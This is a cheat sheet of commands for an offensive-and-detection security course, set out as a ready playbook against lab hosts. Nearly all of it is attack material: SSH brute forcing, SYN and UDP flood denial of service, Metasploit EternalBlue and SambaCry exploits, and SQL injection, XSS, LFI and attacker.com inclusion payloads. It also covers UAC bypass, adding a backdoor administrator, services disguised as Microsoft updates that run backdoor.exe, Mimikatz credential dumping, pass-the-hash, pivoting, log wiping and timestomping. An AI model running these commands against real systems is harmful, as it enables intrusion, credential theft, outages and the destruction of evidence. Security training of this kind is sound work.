# list-command-Offensive-Detection-course
List command that used in Offensive &amp; Detection Course

# Service Exploitation
## scan network & VA
nmap -P0 <IP>
openvas
nessus
  
## bruteforcing
hydra-wizard
hydra -l root -P /usr/share/wordlists/rockyou.txt -u  -s 22  <IP> ssh
  
## DoS
TCP(SYN Flood): hping3 -S -L -w --flood -p 80 <TARGET>
UDP(Volume Based Attack) : hping3 --UDP --flood -p 80 <TARGET>
  
## Sambacry
(metasploit) exploit/linux/samba/is_known_pipename
(msf) set RHOST 192.168.210.104
(msf) exploit

## Eternalblue
(metasploit) exploit/windows/smb/ms17_010_eternalblue
(msf) set RHOST 192.168.210.102
(msf) exploit

# Web Application Attack
## SQL Injection
') union select 1,email,password,4,5,6,7 from users;--
## XSS
<<script>alert("XSS")</script>script>alert("XSS")<</script>/script>
## Local File Inclusion
../../../../../../../../../../etc/passwd
## LFI&RFI&SSRF
render.php?include=http://attacker.com

# Lateral Movement
## normal reconnaissance
tasklist
systeminfo
whoami
whoami /priv
## Bypass UAC & Privilege Escalation
use exploit/windows/local/bypassuac
use exploit/windows/local/bypassuac_eventvwr
set SESSION <id>
exploit
## net command
net localgroup Users
net localgroup Administrators
net user sservice p@ssw0rd /add
net localgroup administrators sservice /add
## Install new service
sc create microsoft_update binpath= "cmd /K start c:\Windows\Temp\backdoor.exe" start= auto error= ignore /c C:\Windows\Temp\backdoor.exe
sc create Microsoft_Update binpath= "cmd /K start C:\Users\john.SECPLAYGROUND\Downloads\update.exe" start= "auto" DisplayName= "Windows Automatic updates"
## Enable Remote Desktop
reg add "hklm\system\currentcontrolset\control\terminal server" /f /v AllowTSConnections /t REG_DWORD /d 1
reg add "hklm\system\currentcontrolset\control\terminal server" /f /v fDenyTSConnections /t REG_DWORD /d 0
netsh firewall set service remoteadmin enable
netsh firewall set service remotedesktop enable
net start termservice
sc config termservice start= auto
## Mimikatz
wget "https://github.com/gentilkiwi/mimikatz/releases/download/2.1.1-20171220/mimikatz_trunk.zip"
unzip mimikatz_trunk.zip
(msf) upload /opt/x64/mimikatz.exe .
(msf) upload /opt/x64/mimidrv.sys .
(msf) upload /opt/x64/mimilib.dll .
(msf) session -i <id>
mimikatz.exe
(mimikatz) privilege::debug
(mimikatz) sekurlsa::logonPasswords full

## Pass-the-hash
git clone https://github.com/byt3bl33d3r/pth-toolkit
reg add HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\system /v LocalAccountTokenFilterPolicy /t REG_DWORD /d 1 /f
pth-winexe -U hash //IP cmd
./pth-winexe -U john%'921988ba001dc8e14a3b108f3fa6cb6d:e19ccf75ee54e06b06a5907af13cef42' //192.168.210.102 cmd.exe
sc query winexesvc
sc start winexesvc
./pth-winexe -U john%'921988ba001dc8e14a3b108f3fa6cb6d:e19ccf75ee54e06b06a5907af13cef42' --system //192.168.210.102 cmd.exe
xfreerdp /u:user /d:domain /pth:hash /v:IPAddress

## WMIC
wmic useraccount list /format:list
wmic group list brief
wmic path win32_process call create "calc.exe"
wmic /node:computername /user:domainname\username path win32_process call create "**empire launcher string here**"
wmic /node:192.168.255.10 /user:"secplayground\john" path win32_process call create "calc.exe"
wmiexec.py -debug john:P@ssw0rd@192.168.210.102

## Pivoting network
(meterpreter) run autoroute -s 192.168.255.0/24
(meterpreter) run post/windows/gather/arp_scanner rhosts=192.168.255.0/24
(msf) use auxiliary/server/socks4a
(msf) set SRVHOST 0.0.0.0
(msf) set SRVPORT 9999
(msf) exploit
Edit /etc/proxychains.conf
proxychains nmap -sT -sV -Pn -n -p22,80,135,139,445 --script=smb-vuln-ms08-067.nse 192.168.255.10
proxychains wmiexec.py -debug john:P@ssw0rd@192.168.255.10

## Delete all system log
wevtutil cl security

## Winrm
PS> Enable-PSRemoting -Force
winrm quickconfig

## schtask - create new schedule task
schtasks /create /tn foobar /tr c:\windows\temp\foobar.exe /sc once /st 00:00 /S host /RU System
schtasks /run /tn foobar /S host
delete schedule task
schtasks /F /delete /tn foobar /S host

## Timestomp
(meterpreter) timestomp mimikatz.exe -v

Resource::
- https://www.botconf.eu/wp-content/uploads/2017/12/2017_tomonaga-muda-Hunting-Attacker-Activities.pdf
- https://www.slideshare.net/votadlos/hunting-lateral-movement-in-windows-infrastructure
- https://bitvijays.github.io/LFF-IPS-P3-Exploitation.html#net-user-domain
